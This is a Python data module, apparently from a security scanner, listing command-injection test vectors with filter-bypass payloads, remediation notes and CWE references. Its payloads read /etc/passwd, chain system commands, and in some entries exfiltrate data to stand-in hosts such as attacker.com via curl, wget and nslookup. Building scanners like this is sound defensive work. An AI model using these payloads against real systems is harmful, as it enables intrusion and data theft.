"""
Advanced Command Injection Testing Vectors
Encoding bypass, blind injection, OOB detection
"""

from ..models import (
    TestVector,
    VulnerabilityType,
    TestVectorPosition as Position,
    PositionType,
    TestVectorPayload as PayloadTemplate,
    TestVectorEvidence as Evidence,
    ConfidenceLevel,
    SensitivityLevel,
)

COMMAND_INJECTION_ADVANCED_VECTORS = [
    TestVector(
        id="cmd-adv-001",
        name="Command Injection with IFS Bypass",
        description="Tests command injection using ${IFS} to bypass space filtering",
        vuln_type=VulnerabilityType.COMMAND_INJECTION,
        position=Position(type=PositionType.QUERY, name="ip", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="127.0.0.1;cat${IFS}/etc/passwd",
            variants=[
                "127.0.0.1;cat${IFS}/etc/passwd",
                "127.0.0.1;cat$IFS$9/etc/passwd",
                "127.0.0.1;{cat,/etc/passwd}",
                "127.0.0.1;cat</etc/passwd",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=["File contents leaked", "Command executed"],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Use safe APIs. Avoid shell execution. Whitelist inputs.",
        references=["https://cwe.mitre.org/data/definitions/78.html"],
        tags=["command-injection", "bypass", "ifs"],
    ),
    TestVector(
        id="cmd-blind-001",
        name="Blind Command Injection - Time Based",
        description="Tests for blind command injection using time delays",
        vuln_type=VulnerabilityType.COMMAND_INJECTION_BLIND,
        position=Position(
            type=PositionType.BODY_JSON, name="filename", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="test.txt;sleep 10",
            variants=[
                "test.txt;sleep 10",
                "test.txt|sleep 10",
                "test.txt`sleep 10`",
                "test.txt$(sleep 10)",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Response delayed ~10 seconds"], confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Validate input strictly. Use safe file handling APIs.",
        references=["https://cwe.mitre.org/data/definitions/78.html"],
        tags=["command-injection", "blind", "time-based"],
    ),
    TestVector(
        id="cmd-oob-001",
        name="Command Injection - OOB via DNS",
        description="Tests for out-of-band command injection detection",
        vuln_type=VulnerabilityType.COMMAND_INJECTION_OOB,
        position=Position(type=PositionType.QUERY, name="host", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="127.0.0.1;nslookup `whoami`.attacker.com",
            variants=[
                "127.0.0.1;nslookup `whoami`.attacker.com",
                "127.0.0.1;curl http://attacker.com/$(whoami)",
                "127.0.0.1;wget http://attacker.com?data=`id|base64`",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=["DNS query to attacker domain", "HTTP request with exfiltrated data"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Implement egress filtering. Use safe APIs.",
        references=["https://cwe.mitre.org/data/definitions/78.html"],
        tags=["command-injection", "oob", "dns-exfiltration"],
    ),
    TestVector(
        id="cmd-adv-002",
        name="Command Injection - Shell Metacharacter Bypass",
        description="Tests command injection using various shell metacharacters",
        vuln_type=VulnerabilityType.COMMAND_INJECTION,
        position=Position(type=PositionType.QUERY, name="file", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="file.txt;ls -la",
            variants=[
                "file.txt;ls -la",
                "file.txt|ls -la",
                "file.txt||ls -la",
                "file.txt&&ls -la",
                "file.txt&ls -la",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Directory listing",
                "Command output in response",
                "Multiple command execution",
            ],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Input validation with allowlist. Use language-specific safe APIs. Avoid shell invocation.",
        references=["https://owasp.org/www-community/attacks/Command_Injection"],
        tags=["command-injection", "metacharacter", "bypass"],
    ),
    TestVector(
        id="cmd-adv-003",
        name="Command Injection - Hex Encoding Bypass",
        description="Tests command injection using hex-encoded payloads",
        vuln_type=VulnerabilityType.COMMAND_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="cmd", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="$(echo 636174202f6574632f706173737764|xxd -r -p)",
            variants=[
                "$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",
                "`echo 636174202f6574632f706173737764|xxd -r -p`",
                "$(echo -e '\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Encoded command decoded and executed", "File contents leaked"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Decode and validate all input. Block encoding functions. Use parameterized execution.",
        references=["https://cwe.mitre.org/data/definitions/78.html"],
        tags=["command-injection", "encoding-bypass", "hex"],
    ),
    TestVector(
        id="cmd-adv-004",
        name="Command Injection - Base64 Encoding Bypass",
        description="Tests command injection using base64-encoded commands",
        vuln_type=VulnerabilityType.COMMAND_INJECTION,
        position=Position(type=PositionType.QUERY, name="data", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash)",
            variants=[
                "$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh)",
                "`echo Y2F0IC9ldGMvcGFzc3dk|base64 -d`",
                "$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=["Base64 decoded command executed", "Sensitive file access"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Block encoding utilities. Validate decoded content. Use safe execution methods.",
        references=["https://owasp.org/www-community/attacks/Command_Injection"],
        tags=["command-injection", "encoding-bypass", "base64"],
    ),
    TestVector(
        id="cmd-adv-005",
        name="Command Injection - Command Chaining",
        description="Tests multiple command execution via chaining operators",
        vuln_type=VulnerabilityType.COMMAND_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="filename", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="test.txt;whoami;id;uname -a",
            variants=[
                "test.txt&&whoami&&id",
                "test.txt||whoami||id",
                "test.txt|whoami|id",
                "test.txt&whoami&id&",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Multiple commands executed",
                "System information leaked",
                "User enumeration",
            ],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Strict input validation. Disable command chaining. Use safe file APIs.",
        references=["https://cwe.mitre.org/data/definitions/78.html"],
        tags=["command-injection", "command-chaining"],
    ),
    TestVector(
        id="cmd-adv-006",
        name="Command Injection - Filter Bypass with Quotes",
        description="Tests command injection bypassing filters using quote manipulation",
        vuln_type=VulnerabilityType.COMMAND_INJECTION,
        position=Position(type=PositionType.QUERY, name="cmd", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="c''at /e''tc/pa''sswd",
            variants=[
                "c'a't /e't'c/p'a's's'w'd",
                'c"a"t /e"t"c/p"a"s"s"w"d',
                "ca\\t /et\\c/pas\\swd",
                "c$@at /e$@tc/pa$@sswd",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Quote bypass successful", "Filtered command executed"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Parse and validate complete command structure. Block quote manipulation. Use allowlist validation.",
        references=["https://owasp.org/www-community/attacks/Command_Injection"],
        tags=["command-injection", "filter-bypass", "quote-manipulation"],
    ),
    TestVector(
        id="cmd-adv-007",
        name="Command Injection - Path Traversal Command",
        description="Tests command injection combined with path traversal",
        vuln_type=VulnerabilityType.COMMAND_INJECTION,
        position=Position(type=PositionType.QUERY, name="file", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="../../../etc/passwd;cat /etc/passwd",
            variants=[
                "....//....//....//etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/passwd;cat /etc/passwd",
                "file;cat ../../etc/passwd",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Path traversal successful",
                "Unauthorized file access",
                "Command execution",
            ],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Validate and sanitize paths. Use absolute paths. Restrict file system access.",
        references=["https://cwe.mitre.org/data/definitions/78.html"],
        tags=["command-injection", "path-traversal"],
    ),
    TestVector(
        id="cmd-adv-008",
        name="Command Injection - Environment Variable Injection",
        description="Tests command injection via environment variable manipulation",
        vuln_type=VulnerabilityType.COMMAND_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="env", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="PATH=/tmp:$PATH;malicious_command",
            variants=[
                "LD_PRELOAD=/tmp/evil.so",
                "IFS=$'\\n';cmd=$'cat\\n/etc/passwd';$cmd",
                "PS4='$(whoami)';set -x;ls",
                "BASH_ENV=/tmp/evil.sh",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Environment variable modified",
                "Malicious code executed",
                "Path hijacking",
            ],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Sanitize environment variables. Use hardcoded paths. Implement execution sandboxing.",
        references=["https://cwe.mitre.org/data/definitions/78.html"],
        tags=["command-injection", "environment-variable", "path-hijacking"],
    ),
    TestVector(
        id="cmd-adv-009",
        name="Command Injection - Command Substitution Backticks",
        description="Tests command substitution using backticks",
        vuln_type=VulnerabilityType.COMMAND_INJECTION,
        position=Position(type=PositionType.QUERY, name="param", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="`whoami`",
            variants=["`id`", "`cat /etc/passwd`", "`uname -a`", "test`whoami`test"],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=["Command substitution executed", "System command output in response"],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Block backtick usage. Validate input format. Use safe parameter passing.",
        references=["https://owasp.org/www-community/attacks/Command_Injection"],
        tags=["command-injection", "command-substitution", "backticks"],
    ),
    TestVector(
        id="cmd-adv-010",
        name="Command Injection - Command Substitution $() Syntax",
        description="Tests command substitution using $() syntax",
        vuln_type=VulnerabilityType.COMMAND_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="value", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="$(whoami)",
            variants=[
                "$(id)",
                "$(cat /etc/passwd)",
                "$(curl http://attacker.com)",
                "test$(whoami)test",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Command substitution successful", "Nested command executed"],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Block $() syntax. Implement strict input validation. Use parameterized APIs.",
        references=["https://cwe.mitre.org/data/definitions/78.html"],
        tags=["command-injection", "command-substitution", "dollar-syntax"],
    ),
    TestVector(
        id="cmd-adv-011",
        name="Command Injection - Newline Injection",
        description="Tests command injection using newline characters",
        vuln_type=VulnerabilityType.COMMAND_INJECTION,
        position=Position(type=PositionType.QUERY, name="input", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="test\\nwhoami\\n",
            variants=[
                "test\\ncat /etc/passwd\\n",
                "test\\rid\\n",
                "test\\r\\nwhoami\\r\\n",
                "test%0awhoami%0a",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=["Newline injection successful", "Multiple commands executed"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Strip newline characters. Validate input format. Use single-line constraints.",
        references=["https://owasp.org/www-community/attacks/Command_Injection"],
        tags=["command-injection", "newline-injection"],
    ),
    TestVector(
        id="cmd-adv-012",
        name="Command Injection - Glob Pattern Exploitation",
        description="Tests command injection using shell glob patterns",
        vuln_type=VulnerabilityType.COMMAND_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="pattern", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="/etc/*",
            variants=["/etc/pass*", "/???/passwd", "/**/passwd", "/etc/[p]asswd"],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Glob expansion", "Unauthorized file enumeration", "Path disclosure"],
            confidence=ConfidenceLevel.MEDIUM,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Disable glob expansion. Validate file paths explicitly. Use allowlist for file access.",
        references=["https://cwe.mitre.org/data/definitions/78.html"],
        tags=["command-injection", "glob-expansion", "wildcard"],
    ),
    TestVector(
        id="cmd-adv-013",
        name="Command Injection via Process Substitution",
        description="Tests for command injection using process substitution syntax",
        vuln_type=VulnerabilityType.COMMAND_INJECTION,
        position=Position(type=PositionType.QUERY, name="input", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="<(whoami)",
            variants=[
                "<(whoami)",
                ">(cat /etc/passwd)",
                "<(curl http://evil.com)",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=["Process substitution executed", "Command output visible", "RCE achieved"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Disable process substitution. Use strict input validation. Avoid shell execution.",
        references=["https://cwe.mitre.org/data/definitions/78.html"],
        tags=["command-injection", "process-substitution", "bash"],
    ),
]

# Total vectors: 15
